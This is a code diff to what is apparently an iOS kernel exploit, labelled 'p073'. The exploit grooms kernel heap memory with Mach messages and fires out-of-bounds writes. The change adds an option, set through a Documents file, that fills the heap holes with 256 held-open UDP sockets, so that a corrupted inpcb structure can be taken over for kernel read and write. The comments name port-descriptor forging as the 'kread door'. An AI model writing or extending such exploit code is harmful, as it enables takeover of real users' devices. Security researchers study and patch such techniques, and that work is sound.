@@ -45,8 +45,10 @@
 #import <stdarg.h>
 #import <string.h>
 #import <unistd.h>
+#import <sys/socket.h>
+#import <netinet/in.h>
 
-#define P073_BUILD @"p073-second-table-v7g-desc16"
+#define P073_BUILD @"p073-second-table-v7h-inpcb-dial"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -54,6 +56,8 @@
 #define P073_N_HOLES      256u   /* v8: consecutive PORTKIND descs, ALL punched (LIFO) */
 #define P073_N_SENT       64u    /* live sentinels before AND after holes */
 #define P073_MAGIC        0x50730000u  /* "P073" */
+static int  g_p073_inpcbFds[P073_N_HOLES];
+static uint32_t g_p073_inpcbN;
 
 /* fire geometry — records 192..253 are OOB (offset >= 0xC00) */
 #define P073_INPUTS       254u
@@ -621,11 +625,41 @@ static NSURL *p073_model_url(NSString *name) {
         }
         nPre++;
     }
+    /* v7h victim-class dial: Documents/p073_victim.txt = "inpcb" switches
+       the HOLE band to LIVE UDP sockets (rw_inpcb neighbors — LightSword/
+       SocketKRW adoption door: a smashed inpcb is adopted directly, no
+       desc/phase alignment needed; 3072-class adjacency measured per boot).
+       Default absent = port-kind (v8 law). The sockets stay OPEN for the
+       whole tap (inpcb live = write-lane neighbor, like the kmsg law). */
+    BOOL v7hInpcb = NO;
+    {
+        NSURL *v7hDocs = [[[NSFileManager defaultManager]
+            URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] firstObject];
+        NSString *vic = v7hDocs ? [NSString stringWithContentsOfURL:
+            [v7hDocs URLByAppendingPathComponent:@"p073_victim.txt"]
+            encoding:NSUTF8StringEncoding error:nil] : nil;
+        v7hInpcb = [vic.lowercaseString containsString:@"inpcb"];
+    }
+    g_p073_inpcbN = 0;
+    if (v7hInpcb) {
+        p073_log(@"[v7h] INPCB BAND — 256 held UDP sockets as victim class");
+        for (uint32_t i = 0; i < P073_N_HOLES; i++) {
+            int sfd = socket(AF_INET, SOCK_DGRAM, 0);
+            if (sfd < 0) break;
+            struct sockaddr_in sa; memset(&sa, 0, sizeof sa);
+            sa.sin_family = AF_INET; sa.sin_len = sizeof sa;
+            sa.sin_port = htons((uint16_t)(30000u + (i & 0xfffu)));
+            if (bind(sfd, (struct sockaddr *)&sa, sizeof sa) != 0) { close(sfd); break; }
+            g_p073_inpcbFds[g_p073_inpcbN++] = sfd;   /* held open — inpcb LIVE */
+        }
+        p073_log(@"[v7h] inpcb band %u/%u sockets held LIVE (fd leaks intentional)",
+                 g_p073_inpcbN, P073_N_HOLES);
+    }
     /* v8: holes are PORTKIND descriptor kmsgs - the fill's record OOB lands
        NEXT to (or over) a PORT DESCRIPTOR by construction; forged type@8 +
        disp@10 = the p073-v7 kread door. Simple fallback keeps the band alive
        if port-kind is rejected. */
-    for (uint32_t i = 0; i < P073_N_HOLES; i++) {
+    for (uint32_t i = (v7hInpcb ? P073_N_HOLES : 0); i < P073_N_HOLES; i++) {
         mach_port_t p = p073_make_port();
         if (p == MACH_PORT_NULL) break;
         holes[nHoles].port = p; holes[nHoles].index = 0x2000u | i; holes[nHoles].alive = YES;
